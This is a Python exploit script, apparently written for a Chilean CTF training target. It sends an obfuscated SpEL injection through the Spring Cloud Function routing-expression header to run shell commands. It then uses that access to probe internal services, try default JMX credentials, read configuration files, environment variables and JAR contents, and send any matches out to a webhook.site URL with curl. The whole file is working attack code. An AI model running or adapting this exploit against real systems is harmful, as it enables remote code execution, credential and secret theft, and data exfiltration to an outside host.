#!/usr/bin/env python3
"""
CTF Chile - Cazador de flags en documentación según pista de SEK
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

# Crear webhook para capturar resultados
print("[*] Creando webhook para captura de flags...")
try:
    uuid_resp = requests.post("https://webhook.site/token", timeout=10)
    UUID = uuid_resp.json()["uuid"]
    WH = "https://webhook.site/" + UUID
    print(f"    🔗 Webhook: https://webhook.site/#!/{UUID}")
except:
    print("[!] Error creando webhook, usando método local")
    UUID = None

def hunt_flag(cmd, tag):
    """Cazar flag con exfiltración externa"""
    if UUID:
        shell = f"({cmd}) | grep -o 'ctfchile{{[^}}]*}}' | head -1 | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?flag=X'"
    else:
        shell = cmd  # Modo local si no hay webhook

    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:35} HTTP {r.status_code}")
        return r.status_code == 500
    except Exception as e:
        print(f"    [!] {tag:35} ERROR: {e}")
        return False

print("="*70)
print("🚩 CAZADOR DE FLAGS EN DOCUMENTACIÓN - PISTA SEK")
print("="*70)

print("\n[1] CAZAR FLAGS EN DOCS DE SERVICIOS INTERNOS")
services = [
    ("10.160.209.1", "8000"),
    ("10.109.220.1", "8000"),
    ("localhost", "8080"),
    ("127.0.0.1", "9090")
]

for host, port in services:
    print(f"\n    🎯 Servicio {host}:{port}")
    hunt_flag(f"curl -s http://{host}:{port}/docs", f"docs_{host}_{port}")
    hunt_flag(f"curl -s http://{host}:{port}/redoc", f"redoc_{host}_{port}")
    hunt_flag(f"curl -s http://{host}:{port}/openapi.json", f"openapi_{host}_{port}")
    hunt_flag(f"curl -s http://{host}:{port}/swagger.json", f"swagger_{host}_{port}")

print("\n[2] CAZAR FLAGS EN ENDPOINTS DE AUTENTICACIÓN")
auth_endpoints = ["/execute", "/admin", "/api", "/auth", "/login"]
for host, port in services[:2]:  # Solo servicios internos
    for endpoint in auth_endpoints:
        hunt_flag(f"curl -s http://{host}:{port}{endpoint}", f"endpoint_{host}_{endpoint.replace('/', '_')}")

print("\n[3] CAZAR FLAGS CON AUTENTICACIÓN JMX")
jmx_creds = [
    ("monitorRole", "QED"),
    ("controlRole", "R&D"),
    ("vault", "admin123")
]

for host, port in services[:2]:
    for user, passwd in jmx_creds:
        hunt_flag(f"curl -s -u {user}:{passwd} http://{host}:{port}/execute", f"jmx_{host}_{user}")
        hunt_flag(f"curl -s -u {user}:{passwd} http://{host}:{port}/docs", f"jmx_docs_{host}_{user}")

print("\n[4] CAZAR FLAGS EN RESPUESTAS DE ERROR")
for host, port in services[:2]:
    hunt_flag(f"curl -s http://{host}:{port}/nonexistent", f"error_{host}_{port}")
    hunt_flag(f"curl -s -I http://{host}:{port}/", f"headers_{host}_{port}")

print("\n[5] CAZAR FLAGS EN ARCHIVOS DE CONFIGURACIÓN")
config_paths = [
    "/app/application.properties",
    "/app/application.yml",
    "/app/config.properties",
    "/etc/nginx/nginx.conf",
    "/opt/app/config.json"
]

for config in config_paths:
    hunt_flag(f"cat {config} 2>/dev/null", f"config_{config.replace('/', '_')}")

print("\n[6] CAZAR FLAGS EN CONTENIDO JAR")
hunt_flag("unzip -l /app/app.jar | grep -E '(docs|api|swagger)'", "jar_docs_list")
hunt_flag("unzip -p /app/app.jar | strings | grep 'ctfchile{'", "jar_strings")

print("\n[7] CAZAR FLAGS EN VARIABLES Y PROCESOS")
hunt_flag("env", "environment_vars")
hunt_flag("ps aux | grep -v grep", "processes")

if UUID:
    print(f"\n⏰ Esperando 15 segundos para capturar resultados...")
    time.sleep(15)

    print(f"\n🔍 ANALIZANDO RESULTADOS DEL WEBHOOK...")
    try:
        r = requests.get(f"https://webhook.site/token/{UUID}/requests", timeout=20)
        data = r.json().get("data", [])

        flags_found = []
        for req in data[:20]:  # Últimas 20 requests
            url = req.get("url", "")
            query = req.get("query", {})
            flag_data = query.get("flag")

            if flag_data:
                try:
                    if isinstance(flag_data, list):
                        flag_data = flag_data[0]

                    import base64
                    decoded_flag = base64.b64decode(flag_data).decode("utf-8", "replace")

                    if "ctfchile{" in decoded_flag:
                        tag = url.split(UUID)[-1].split("?")[0].lstrip("/")
                        flags_found.append((tag, decoded_flag))

                except Exception as e:
                    continue

        if flags_found:
            print(f"\n🚩🚩🚩 FLAGS ENCONTRADOS! 🚩🚩🚩")
            for tag, flag in flags_found:
                print(f"    📍 {tag}: {flag}")
        else:
            print(f"\n💭 No se encontraron flags en la documentación")
            print(f"   🔍 Revisar manualmente: https://webhook.site/#!/{UUID}")

    except Exception as e:
        print(f"[!] Error analizando webhook: {e}")
        print(f"    Revisar manualmente: https://webhook.site/#!/{UUID}")

print("\n" + "="*70)
print("🎯 CAZA DE FLAGS COMPLETADA")
print("Si no se encontraron flags, el desafío puede requerir:")
print("   1. Acceso SSH directo a los servicios internos")
print("   2. Escalación de privilegios dentro del container")
print("   3. Técnicas de pivoting más avanzadas")
print("="*70)